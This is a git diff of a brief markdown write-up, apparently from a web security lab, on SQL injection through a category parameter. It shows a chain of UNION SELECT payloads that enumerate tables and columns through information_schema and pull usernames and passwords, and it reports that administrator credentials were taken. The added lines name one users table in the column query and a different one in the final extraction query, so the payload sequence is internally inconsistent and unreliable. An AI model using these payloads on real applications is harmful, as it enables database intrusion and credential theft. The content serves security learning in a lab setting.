@@ -13,9 +13,17 @@ Category parameter
 ## Payload Used
   
   UNION SELECT table_name, NULL FROM information_schema.tables--
-  UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users_bmjshg'--
-  UNION SELECT username_knhvzh, password_gkgolw FROM users_bmjshg
-  
+
+<img width="1486" height="806" alt="1" src="https://github.com/user-attachments/assets/758c7731-4857-4af0-8b67-277ce5511eca" />
+
+  UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users_oerjyi'--
+
+  <img width="1477" height="756" alt="2" src="https://github.com/user-attachments/assets/2a0bd157-e086-4369-a717-27c6e0e24880" />
+
+  UNION SELECT username_txhvkg, password_zxhqbf FROM users_bmjshg
+
+  <img width="1491" height="761" alt="3" src="https://github.com/user-attachments/assets/c8c5b6be-ce00-4dac-8918-8b180a1b730e" />
+
 ## Result
 - Successfully extracted administrator credentials after enumerating tables and columns using information_schema.
 
